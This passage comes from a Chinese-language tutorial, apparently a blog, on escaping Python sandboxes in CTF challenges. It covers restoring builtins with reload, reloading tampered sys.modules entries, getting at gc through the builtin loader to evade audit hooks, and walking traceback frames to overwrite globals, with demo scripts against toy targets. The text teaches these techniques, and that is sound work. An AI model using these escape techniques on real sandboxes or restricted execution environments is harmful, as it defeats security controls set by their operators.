<h2 id="reload-重新加载"><a href="#reload-重新加载" class="headerlink" title="reload 重新加载"></a>reload 重新加载</h2><p><code>reload()</code> 函数的作用是<strong>重新加载一个已经导入的模块</strong>。在某些场景（例如沙箱逃逸）中，如果内置函数被删除，可以通过 <code>reload()</code> 恢复模块原始状态，从而找回被删掉的函数。</p>
<h3 id="Python-2-中的行为"><a href="#Python-2-中的行为" class="headerlink" title="Python 2 中的行为"></a>Python 2 中的行为</h3><p>在 Python 2 中，<code>reload</code> 是一个内置函数，可以直接使用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]  <span class="comment"># 删除 eval</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)  <span class="comment"># 重新加载 __builtins__</span></span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]  <span class="comment"># 恢复成功</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>reload(__builtin__)</code> 会<strong>重新初始化</strong>内置模块，把默认符号（<code>eval</code> 等）<strong>重新填回</strong>。</p>
<p>Python 2 下，删除的内置函数可以通过 <code>reload(__builtins__)</code> 恢复。</p>
<h3 id="Python-3-中的行为"><a href="#Python-3-中的行为" class="headerlink" title="Python 3 中的行为"></a>Python 3 中的行为</h3><p>在 Python 3 中，<code>reload()</code> 被移到了 <code>importlib</code> 模块：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.reload(module)</span><br></pre></td></tr></table></figure></div>

<p>但 Python 3 对 <code>__builtins__</code> 的 <code>reload</code> 行为<strong>做了限制</strong>，<code>importlib.reload(__builtins__)</code> <strong>不会恢复</strong>被删除的内置函数。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>这是因为在 Python3 中 <code>importlib.reload(builtins)</code> 走的是 <strong>importlib 的重载协议</strong>。对“内置模块”来说，加载器（BuiltinImporter）在 <strong>reload 时不会重新跑 C 级初始化</strong>（基本是空操作），因此<strong>不会重建&#x2F;填充模块字典</strong>。你删过的名字就还是没了。</p>
<p>而在 Python2 中 <code>reload(__builtin__)</code> 会再次调用该内置模块的 <strong>C 级初始化函数</strong>（<code>init__builtin__</code>），从而把默认的内建名字（<code>eval</code> 等）<strong>重新填回模块字典</strong>。所以删掉的东西能回来。</p>
<h2 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h2><p><strong><code>sys.modules</code></strong> 是 Python 解释器内部的<strong>模块缓存字典</strong>，键是模块名（字符串），值是已加载的模块对象。每次执行 <code>import xxx</code> 时，Python **先检查 <code>sys.modules</code>**：</p>
<ul>
<li>如果存在同名 key，就直接返回里面的对象（不重新加载文件）。</li>
<li>如果不存在，就去找模块文件（或内置模块等），加载后放到 <code>sys.modules</code>。</li>
</ul>
<p>这意味着——如果有人在沙箱中<strong>恶意替换</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>那么 <code>import os</code> 拿到的就是字符串 <code>&quot;not allowed&quot;</code>，而不是模块对象，后续任何属性访问都会出错。</p>
<p>除此之恶意替换 <code>os</code> 模块还会影响其他模块。因为许多库（如 <code>subprocess</code>、<code>shutil</code>、<code>tempfile</code>）内部<strong>隐式导入</strong>了 <code>os</code> 模块：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED, ...</span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>os</code> 变成了一个字符串，自然会触发：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</span><br></pre></td></tr></table></figure></div>

<p>因为它期望 <code>os</code> 是个模块对象。</p>
<p>由于 <code>import</code> 机制是**先查 <code>sys.modules</code>**，所以：</p>
<ul>
<li>如果你不先 <code>del sys.modules[&#39;os&#39;]</code>，它永远不会去真正加载 <code>os</code> 模块文件。</li>
<li>删除后再 <code>import os</code>，解释器会走正常的模块加载流程，从磁盘或内置模块表重新导入。</li>
</ul>
<p>示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 沙箱里被替换</span></span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接导入会拿到坏的对象</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]   <span class="comment"># 删除缓存</span></span><br><span class="line"><span class="keyword">import</span> os               <span class="comment"># 重新加载</span></span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)         <span class="comment"># OK</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>必须删除 key</strong><br> 不能直接赋值 <code>None</code>，因为 <code>None</code> 依旧是缓存的一部分，<code>import</code> 不会重新加载。</p>
</li>
<li><p><strong>模块依赖链</strong><br> 如果 <code>os</code> 被替换，其他已加载的模块中可能<strong>已经持有坏引用</strong>，比如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;bad&quot;</span></span><br><span class="line">subprocess.os    <span class="comment"># 依旧是坏的</span></span><br></pre></td></tr></table></figure></div>

<p>这种情况要重新加载依赖模块：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os, subprocess</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>内置模块</strong>（如 <code>sys</code>、<code>builtins</code>）即使被 <code>del</code>，也不会真的丢失，它们由解释器本身维护，可以重新加载。</p>
</li>
</ul>

    </div>
  </div>

<h2 id="使用-globals-获取-builtins-方法"><a href="#使用-globals-获取-builtins-方法" class="headerlink" title="使用 globals() 获取 builtins 方法"></a>使用 globals() 获取 builtins 方法</h2><p>在一些题目中，可能通过覆盖内置的函数来限制我们使用。例如下面的代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_fun_callback</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Player! It&#x27;s already banned!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">vars</span> = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line"><span class="built_in">dir</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">getattr</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">exec</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">__import__</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">compile</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">breakpoint</span> = blacklist_fun_callback</span><br></pre></td></tr></table></figure></div>

<p>但 builtins 模块是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;breakpoint&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>但如果题目直接通过下面的方式来删除，那就没有办法了，即使 reload 重新导入 builtins 模块，较新版本的 python 中也无法恢复。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">breakpoint</span></span><br></pre></td></tr></table></figure></div>

<h2 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h2><p><code>del sys.modules[&#39;模块名&#39;]</code> <strong>只删除字典项，不会销毁模块对象本身</strong>，只要还有其他引用，模块依然存在于内存中。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure></div>

<p><code>gc</code> 是Python 的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。<code>gc</code> 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>而 <code>gc</code> 模块本身属于<strong>内建&#x2F;冻结模块</strong>，能够通过 <code>__builtins__</code> 的  <code>__loader__.load_module</code> 加载，从而绕过一些<strong>审计钩子（audit hook）</strong>对“常规导入流程”的监控。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;gc&#x27;</span> <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).builtin_module_names</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<p>完整演示代码如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 1) 在 __main__ 里准备“演示被篡改”的目标对象 =====</span></span><br><span class="line">secret_data = <span class="string">&quot;TOP_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[original] hidden_func called&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;【初始状态】secret_data =&quot;</span>, secret_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;【初始状态】调用 hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">hidden_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 2) 模拟防御：从 sys.modules 删除所有已加载模块的引用 =====</span></span><br><span class="line"><span class="comment"># 这样做会让正常的 import 失效，无法通过 sys.modules 找回模块对象</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 3) 绕过 import 限制：用内建导入器的 load_module 加载 gc 模块 =====</span></span><br><span class="line"><span class="comment"># __builtins__.__loader__ 是 BuiltinImporter（只能加载内建/冻结模块，如 sys、gc）</span></span><br><span class="line"><span class="comment"># 这里用它绕过 import，直接获取 gc 来枚举堆上的所有对象</span></span><br><span class="line">gc = __builtins__.__loader__.load_module(<span class="string">&#x27;gc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 通过 gc.get_objects() 扫描堆上的所有 Python 对象，寻找目标模块对象 ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">mod_main = <span class="literal">None</span></span><br><span class="line">mod_os = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="comment"># 用 &#x27;__name__&#x27; 筛选出模块对象</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> obj.__name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 找到模块 __main__&quot;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">elif</span> obj.__name__ == <span class="string">&#x27;os&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 找到模块 os&quot;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 4) 篡改 __main__ 模块中的全局变量与函数 =====</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] __main__ 中可见的目标属性:&quot;</span>, [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">dir</span>(mod_main) <span class="keyword">if</span> n <span class="keyword">in</span> &#123;<span class="string">&quot;secret_data&quot;</span>, <span class="string">&quot;hidden_func&quot;</span>&#125;])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖变量</span></span><br><span class="line">mod_main.secret_data = <span class="string">&quot;HACKED_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hacked_hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[hacked] hidden_func called!&quot;</span>)</span><br><span class="line"></span><br><span class="line">mod_main.hidden_func = hacked_hidden_func</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 5) 验证篡改效果（注意：访问的依然是当前模块的全局名） =====</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n【修改后】secret_data =&quot;</span>, secret_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;【修改后】调用 hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">hidden_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 6) 额外演示：如果成功找回了 os 模块，就调用它的功能 =====</span></span><br><span class="line"><span class="keyword">if</span> mod_os:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] 使用找回的 os 模块列当前目录:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(mod_os.listdir(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[!] 未找到 os 模块对象（可能没有其它引用存活）&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>另外在 3.11 版本和 python 3.8.10 版本中测试发现 <code>gc.get_objects</code> 会被 audit hook 监控。</p>
<h2 id="利用-traceback-获取模块"><a href="#利用-traceback-获取模块" class="headerlink" title="利用 traceback 获取模块"></a>利用 traceback 获取模块</h2><p><code>raise Exception()</code> 会创建一个异常对象，同时生成一条 <strong>traceback 链</strong>（<code>tb</code>）。<br> <code>tb</code> 是一个<strong>单向链表</strong>，每个节点代表一次调用处的<strong>执行帧</strong>（<code>frame</code>）。<br> 我们可以通过：</p>
<ul>
<li><code>tb.tb_frame</code> 拿到<strong>当前节点的帧对象</strong>（<code>frame</code>）</li>
<li><code>tb.tb_next</code> 走到<strong>下一段调用</strong>的 traceback</li>
<li>在帧对象上用：<ul>
<li><code>frame.f_globals</code> 访问<strong>该帧所在模块的全局命名空间</strong></li>
<li><code>frame.f_locals</code> 访问<strong>该帧的局部变量</strong></li>
<li><code>frame.f_back</code> 从<strong>当前帧回溯到调用者帧</strong></li>
</ul>
</li>
</ul>
<p>当我们遍历到<strong>目标作用域</strong>（例如 <code>__main__</code> 的全局字典，或包含特定标识符的帧）后，就能<strong>直接修改那里的变量&#x2F;函数</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标：演示要被修改的全局对象（位于 __main__）</span></span><br><span class="line">secret_data = <span class="string">&quot;TOP_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[original] hidden_func called&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= 业务栈 =========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>():</span><br><span class="line">    <span class="comment"># 这里只抛，不要捕；让 traceback 带上多层调用信息</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Demo traceback chain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>():</span><br><span class="line">    level3()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>():</span><br><span class="line">    level2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= 工具：从 traceback 链里找到目标 frame =========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_frame_in_tb</span>(<span class="params">tb, want_key=<span class="literal">None</span>, module_name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从 traceback 链里定位满足条件的 frame：</span></span><br><span class="line"><span class="string">      - want_key: 在 f_globals 里必须含有这个 key（比如 &#x27;hidden_func&#x27;）</span></span><br><span class="line"><span class="string">      - module_name: f_globals[&#x27;__name__&#x27;] 必须等于它（比如 &#x27;__main__&#x27;）</span></span><br><span class="line"><span class="string">    两个条件任一满足即可。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cur = tb</span><br><span class="line">    <span class="keyword">while</span> cur:</span><br><span class="line">        f = cur.tb_frame                      <span class="comment"># 这里在 3.11 某些审计环境中可能触发 object.__getattr__ 事件</span></span><br><span class="line">        g = f.f_globals</span><br><span class="line">        <span class="keyword">if</span> ((want_key <span class="keyword">and</span> want_key <span class="keyword">in</span> g) <span class="keyword">or</span></span><br><span class="line">            (module_name <span class="keyword">and</span> g.get(<span class="string">&quot;__name__&quot;</span>) == module_name)):</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">        cur = cur.tb_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= 主流程 =========</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;【初始】secret_data =&quot;</span>, secret_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;【初始】调用 hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>); hidden_func()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        level1()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 1) 取到 traceback 链</span></span><br><span class="line">        tb = e.__traceback__  <span class="comment"># 等价于 sys.exc_info()[2]；保留原始链路</span></span><br><span class="line">        <span class="comment"># 2) 在 traceback 链里找 __main__ 对应的 frame（或含有目标名的 frame）</span></span><br><span class="line">        frame = find_frame_in_tb(tb, want_key=<span class="string">&quot;hidden_func&quot;</span>, module_name=<span class="string">&quot;__main__&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> frame:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 没在 traceback 链里找到目标作用域&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        g = frame.f_globals</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 命中作用域：&quot;</span>, g.get(<span class="string">&quot;__name__&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) 修改全局变量与函数</span></span><br><span class="line">        g[<span class="string">&quot;secret_data&quot;</span>] = <span class="string">&quot;HACKED_SECRET&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">hacked_hidden_func</span>():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[hacked] hidden_func called!&quot;</span>)</span><br><span class="line">        g[<span class="string">&quot;hidden_func&quot;</span>] = hacked_hidden_func</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) 验证结果（注意：依然通过当前模块的全局名访问）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n【修改后】secret_data =&quot;</span>, secret_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;【修改后】调用 hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>); hidden_func()</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
